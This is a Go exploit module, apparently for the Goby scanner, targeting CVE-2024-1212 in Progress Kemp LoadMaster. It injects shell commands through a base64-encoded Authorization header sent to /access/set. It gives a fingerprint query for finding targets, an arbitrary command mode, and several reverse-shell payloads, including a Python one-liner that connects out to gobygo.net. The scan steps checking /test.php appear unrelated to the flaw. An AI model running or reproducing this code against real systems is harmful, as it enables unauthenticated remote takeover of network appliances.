package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Progress Kemp LoadMaster  /access/set Command Execution Vulnerability(CVE-2024-1212)",
    "Description": "<p>Progress Kemp LoadMaster is a high-performance application delivery controller (ADC) and load balancer providing availability, scalability, and security for customers’ business-critical applications and websites.</p><p>Unauthenticated remote attackers can access the system through the LoadMaster management interface, enabling arbitrary system command execution.</p>",
    "Product": "KEMP-Tech-LoadMaster",
    "Homepage": "https://kemptechnologies.com/",
    "DisclosureDate": "2024-02-22",
    "PostTime": "2024-06-21",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\">LoadMaster</div>\" && title=\"Configuration\"",
    "GobyQuery": "body=\">LoadMaster</div>\" && title=\"Configuration\"",
    "Level": "3",
    "Impact": "<p>Unauthenticated remote attackers can access the system through the LoadMaster management interface, enabling arbitrary system command execution.</p>",
    "Recommendation": "<p>Currently, the official patch for this vulnerability has been released. Users can refer to the following link to update promptly. </p><p>patch:<a href=\"https://support.kemptechnologies.com/hc/en-us/articles/23878931058445-LoadMaster-Security-Vulnerability-CVE-2024-1212\">https://support.kemptechnologies.com/hc/en-us/articles/23878931058445-LoadMaster-Security-Vulnerability-CVE-2024-1212</a></p>",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1212",
        "https://avd.aliyun.com/detail?id=AVD-2024-1212"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "BySh",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2024-1212"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "Progress Kemp LoadMaster /access/set 远程命令执行漏洞（CVE-2024-1212）",
            "Product": "KEMP-Tech-LoadMaster",
            "Description": "<p>Progress Kemp LoadMaster是一款负载均衡和应用交付控制器，由Progress Software Corporation（前身为Kemp Technologies）开发和提供。<br></p><p>Progress Kemp LoadMaster存在命令注入漏洞，未经身份验证的远程攻击者可以通过 LoadMaster 管理界面访问系统，从而实现任意系统命令执行。<br></p>",
            "Recommendation": "<p>目前，官方已发布针对此漏洞的补丁程序，用户可参考以下链接及时更新。&nbsp;&nbsp;</p><p>补丁:<a href=\"https://support.kemptechnologies.com/hc/en-us/articles/23878931058445-LoadMaster-Security-Vulnerability-CVE-2024-1212\">https://support.kemptechnologies.com/hc/en-us/articles/23878931058445-LoadMaster-Security-Vulnerability-CVE-2024-1212</a><br></p>",
            "Impact": "<p>未经身份验证的远程攻击者可以通过 LoadMaster 管理界面访问系统，从而实现任意系统命令执行。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Progress Kemp LoadMaster  /access/set Command Execution Vulnerability(CVE-2024-1212)",
            "Product": "KEMP-Tech-LoadMaster",
            "Description": "<p>Progress Kemp LoadMaster is&nbsp;a&nbsp;high-performance&nbsp;application&nbsp;delivery&nbsp;controller&nbsp;(ADC)&nbsp;and&nbsp;load&nbsp;balancer&nbsp;providing&nbsp;availability,&nbsp;scalability,&nbsp;and&nbsp;security&nbsp;for&nbsp;customers’&nbsp;business-critical&nbsp;applications&nbsp;and&nbsp;websites.<br></p><p>Unauthenticated remote attackers can access the system through the LoadMaster management interface, enabling arbitrary system command execution.<br></p>",
            "Recommendation": "<p>Currently, the official patch for this vulnerability has been released. Users can refer to the following link to update promptly.&nbsp;</p><p>patch:<a href=\"https://support.kemptechnologies.com/hc/en-us/articles/23878931058445-LoadMaster-Security-Vulnerability-CVE-2024-1212\">https://support.kemptechnologies.com/hc/en-us/articles/23878931058445-LoadMaster-Security-Vulnerability-CVE-2024-1212</a><br></p>",
            "Impact": "<p>Unauthenticated remote attackers can access the system through the LoadMaster management interface, enabling arbitrary system command execution.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|CommandExecEcho"
    },
    "PocId": "10962"
}`
	setPayloadRequestHash4534 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		//漏洞url地址
    commandResult := ""
		url := "/access/set?param=enableapi&value=1"
		makeRequest := httpclient.NewGetRequestConfig(url)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
    command= strings.Replace(command, "'", "\"", -1)
    command="';echo;"+command+";': tester"
	  commandBytes := []byte(command)
    encodedData := base64.URLEncoding.EncodeToString(commandBytes)
    makeRequest.Header.Store("Authorization", "Basic "+encodedData)
    if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
      commandResult=resp.RawBody
      return commandResult, url, nil
    }else{
      return commandResult, url, err
    }
	}
  setPayloadRequestHash4567 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		//漏洞url地址
    commandResult := ""
		url := "/access/set?param=enableapi&value=1"
		makeRequest := httpclient.NewGetRequestConfig(url)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
    command= strings.Replace(command, "'", "\"", -1)
    command="';"+command+";': tester"
	  commandBytes := []byte(command)
    encodedData := base64.URLEncoding.EncodeToString(commandBytes)
    makeRequest.Header.Store("Authorization", "Basic "+encodedData)
    if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
      commandResult=resp.RawBody
      return commandResult, url, nil
    }else{
      return commandResult, url, err
    }
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash4534

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
      runPayload := setPayloadRequestHash4567
			runPayload2 := setPayloadRequestHash4534

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload2(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
 
				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
